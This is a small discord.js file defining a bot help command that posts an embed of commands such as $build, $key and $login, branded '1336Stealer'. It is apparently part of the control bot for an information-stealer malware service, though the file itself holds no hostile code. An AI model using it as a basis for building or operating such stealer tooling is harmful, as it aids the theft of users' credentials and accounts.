const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {
  const help = new Discord.MessageEmbed()
  .setDescription(`\`$build\`\n\`$gamebind\`\n\`$info\`\n\`$login\`\n\`$guilds\`\n\`$getrole\`\n\`$key\`\n\`$deletekey\``)
  .setAuthor(`1336Stealer`, "https://media.discordapp.net/attachments/1012840502598582434/1013143149859831968/a_721d6729d0b5e1a8979ab7a445378e9a.gif")
  .setFooter("1336stealer")
  .setColor("2f3136")
  message.channel.send(help)
  }
module.exports.help = {
  name: "help"
}